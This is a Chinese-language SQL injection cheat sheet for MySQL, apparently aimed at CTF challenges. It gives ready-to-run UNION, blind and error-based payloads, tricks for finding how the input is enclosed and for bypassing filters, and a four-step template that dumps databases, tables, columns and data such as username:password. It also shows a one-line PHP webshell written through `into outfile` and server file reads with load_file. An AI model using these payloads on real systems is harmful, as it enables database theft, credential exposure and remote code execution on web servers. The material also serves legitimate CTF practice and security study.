# SQL 注入速查表（MySQL）

> 按"库 → 表 → 列 → 数据"的动线整理。每条都给含义和能直接跑的示例。

## 一、information_schema：数据库的"目录"

MySQL 自带的元数据库，记录所有库、表、列的信息。注入时它就是地图。

| 表 | 含义 | 常用列 | 示例 |
|---|---|---|---|
| `schemata` | 所有**数据库** | `schema_name` | `select schema_name from information_schema.schemata` |
| `tables` | 所有**表**（含视图） | `table_schema` `table_name` `table_type` | `select table_name from information_schema.tables where table_schema='ctf'` |
| `columns` | 所有**列** | `table_schema` `table_name` `column_name` `data_type` | `select column_name from information_schema.columns where table_name='users'` |
| `views` | 视图定义 | `table_name` `view_definition` | `select view_definition from information_schema.views` |
| `routines` | 存储过程 / 函数 | `routine_name` `routine_definition` | `select routine_name from information_schema.routines` |
| `processlist` | 正在执行的 SQL | `info` `user` `host` | `select info from information_schema.processlist` |
| `user_privileges` | 当前用户权限 | `grantee` `privilege_type` | `select privilege_type from information_schema.user_privileges` |

配套的**列名含义**：

| 列 | 含义 | 取值示例 |
|---|---|---|
| `schema_name` | 数据库名 | `ctf` |
| `table_schema` | 表所属的数据库名 | `ctftraining` |
| `table_name` | 表名 | `users` |
| `column_name` | 列名 | `password` |
| `data_type` | 列的数据类型 | `varchar(64)` |
| `table_type` | 表还是视图 | `BASE TABLE` / `VIEW` |

## 二、常用函数

### 拼接与聚合

| 函数 | 含义 | 示例 |
|---|---|---|
| `group_concat(x)` | 把**多行**值拼成一个字符串（默认逗号分隔） | `select group_concat(table_name) from information_schema.tables` |
| `group_concat(x separator ' | ')` | 自定义分隔符 | `select group_concat(schema_name separator '--') from information_schema.schemata` |
| `concat(a,b)` | 把多个值拼成一个（NULL 会污染整体） | `select concat(username,':',password) from users` |
| `concat_ws(',',a,b)` | 带分隔符拼接，忽略 NULL | `select concat_ws(':',username,password) from users` |
| `group_concat_max_len` | 拼接长度上限，默认 1024 字节 | 被截断时用 `limit` 逐行取 |

### 截取与编码（盲注主力）

| 函数 | 含义 | 示例 |
|---|---|---|
| `substr(s,pos,len)` / `substring` | 从第 pos 位取 len 个字符 | `select substr(database(),1,1)` |
| `ascii(s)` / `ord(s)` | 取首字符的 ASCII 码 | `select ascii(substr(database(),1,1))` → 99 |
| `char(99)` | ASCII 码转字符 | `select char(99)` → `c` |
| `length(s)` / `char_length(s)` | 字符串长度 | `select length(database())` |
| `hex(s)` / `unhex(s)` | 十六进制转换 | `select hex('ctf')` → `637466` |
| `mid(s,pos,len)` | 同 `substr` | `select mid(database(),1,2)` |

> 十六进制的用处：`where table_schema=0x637466` 等价于 `='ctf'`，用来绕单引号过滤。

### 环境探测

| 函数 / 变量 | 含义 | 示例 |
|---|---|---|
| `database()` | 当前数据库名 | `select database()` |
| `version()` / `@@version` | MySQL 版本 | `select @@version` |
| `user()` / `current_user()` | 当前连接用户 | `select user()` |
| `@@datadir` | 数据目录路径 | `select @@datadir` |
| `@@hostname` | 主机名 | `select @@hostname` |
| `@@version_compile_os` | 操作系统 | `select @@version_compile_os` |
| `@@secure_file_priv` | 允许读写文件的目录（限制写 shell） | `select @@secure_file_priv` |

### 读写文件 / 执行

| 语句 | 含义 | 示例 |
|---|---|---|
| `load_file(path)` | 读服务器文件（需要 FILE 权限） | `select load_file('/flag')` |
| `into outfile 'path'` | 写文件（常用来写 webshell） | `select '<?php eval($_POST[1]);?>' into outfile '/var/www/shell.php'` |
| `into dumpfile` | 写二进制 | 同上，写法不同 |
| `sleep(n)` | 延迟 n 秒（时间盲注） | `and sleep(3)` |
| `benchmark(n,expr)` | 重复执行消耗时间 | `and benchmark(1000000,md5('a'))` |

### 报错注入（页面不回显、只报错时用）

| 函数 | 用法 | 说明 |
|---|---|---|
| `updatexml()` | `and updatexml(1,concat(0x7e,(select database()),0x7e),1)` | 报错信息里带出数据，长度约 32 字符 |
| `extractvalue()` | `and extractvalue(1,concat(0x7e,(select database())))` | 同上，更短 |
| `floor(rand()*2)` | `and (select 1 from (select count(*),concat(database(),floor(rand()*2))x from information_schema.tables group by x)a)` | 经典报错，可带出较长数据 |
| `exp()` | `and exp(~(select * from(select database())a))` | 溢出报错 |

## 三、语法关键字与运算符

| 关键字 / 符号 | 含义 | 注意 |
|---|---|---|
| `select ... from ...` | 查询 | 注入的骨架 |
| `union [all] select` | 合并两个查询结果 | 列数必须相同；`all` 保留重复行 |
| `where` | 过滤条件 | 爆表/爆列时用来限定库或表 |
| `order by n` | 按第 n 列排序 | **判断列数**的常用手法：`order by 3` 报错说明只有 2 列 |
| `limit offset,count` | 分页取 | `limit 0,1` 取第一条，逐条递增 |
| `and` / `or` | 逻辑运算 | 布尔盲注核心：`and 1=1` / `and 1=2` |
| `-- ` | 注释到行尾（**必须跟空格**） | URL 里写 `--+` 或 `--%20-` |
| `#` | 注释到行尾（不需空格） | URL 里要写 `%23` |
| `/* */` | 块注释 | 可内联：`/*!50000select*/` 绕过关键字过滤 |
| `'` `"` | 字符串 / 闭合 | 报错时先想是不是引号没闭合 |
| `)` | 闭合括号 | 输入被包在 `((((((` 里时，先补 6 个 `)` |

## 四、先确定闭合符

**闭合符不是固定语法**，取决于你的输入被源码里的什么包住。`id=0))))))` 只适用于"6 层括号包裹"这一种情况，换成别的题目就报错。

| 源码里的拼接 | 输入被包在什么里 | payload 开头 |
|---|---|---|
| `WHERE id = ` . $_GET['id'] | 数字，无包裹 | `id=0 union select 1,2 --+` |
| `WHERE id = '` . $_GET['id'] . `'` | 单引号 | `id=0' union select 1,2 --+` |
| `WHERE id = ('` . $_GET['id'] . `')` | 单引号 + 一层括号 | `id=0') union select 1,2 --+` |
| `WHERE id = (((((( ` . $_GET['id'] . ` ))))))` | 6 层括号 | `id=0)))))) union select 1,2 --+` |
| `WHERE name LIKE '%` . $_GET['n'] . `%'` | 单引号 + 百分号 | `id=0%' union select 1,2 --+` |

**怎么确定**：

1. 能看到源码 → 直接数括号、看引号
2. 看不到源码 → 试错：先传 `1'`，报错说明被引号包着；再补 `)` 直到语法错误消失
3. 闭合之后，**一定要用 `--+` 把模板残余的引号/括号注释掉**，否则会多出未匹配的符号

## 五、四步取数模板

把 `[闭合]` 换成上一步确定的符号（没有包裹就留空）。

```sql
-- 1) 爆库
id=0[闭合] union select 1,group_concat(schema_name) from information_schema.schemata --+

-- 2) 爆表
id=0[闭合] union select 1,group_concat(table_name) from information_schema.tables where table_schema='库名' --+

-- 3) 爆列
id=0[闭合] union select 1,group_concat(column_name) from information_schema.columns where table_schema='库名' and table_name='表名' --+

-- 4) 取数据
id=0[闭合] union select 1,group_concat(列名) from 库名.表名 --+
```

> 本文示例题目里，`[闭合]` = `))))))`（6 个右括号）。

一步全打（小库适用）：

```sql
id=0[闭合] union select 1,group_concat(table_schema,0x2e,table_name,0x3a,column_name) from information_schema.columns where table_schema='库名' --+
```


`0x2e` = `.`，`0x3a` = `:`，用来给输出加分隔，方便看。

## 六、排错清单

| 现象 | 原因 | 处理 |
|---|---|---|
| `different number of columns` | UNION 两边列数不一致 | 先 `order by n` 或 `union select 1,2,3` 试出列数 |
| 语法错误，位置在末尾 | 模板残余括号没注释 | 补 `)--+` 或 `-- -` |
| 什么都查不出来，但没报错 | 前半段 `id=1` 有真实数据混着，或数据不在当前库 | 改 `id=0`，并显式指定 `table_schema` |
| 只显示一列 | 页面只回显第一个字段 | 把要显示的放第一列：`union select group_concat(...),2` |
| 结果被截断，末尾没有逗号 | `group_concat` 超过 1024 字节 | 用 `limit 0,1` 逐行取 |
| 引号被过滤 | WAF/过滤 | 用 `0x637466` 十六进制代替 `'ctf'` |
| 页面完全无回显 | 盲注场景 | 布尔盲注 `and ascii(substr(...))>100`，或时间盲注 `and sleep(3)` |
| `load_file` 返回 NULL | 无 FILE 权限 / `secure_file_priv` 限制 | 换读表，或确认路径与权限 |

## 七、随手记忆的口诀

- **库 → 表 → 列 → 数据**，一级一级往下问
- **information_schema 是目录**：schemata(库) / tables(表) / columns(列)
- **union 要列数对齐**，**group_concat 把多行变一行**
- **不确定的字符串用 hex**，`0x637466` = `'ctf'`
- **注释是 `-- `（带空格）**，URL 里写成 `--+`
- **闭合符跟着包裹形态变**：无包裹 / `'` / `')` / `))))))` 各不相同，先确认再套模板
- **先 `order by` 探列数，再 `union select 1,2,3` 探回显位**
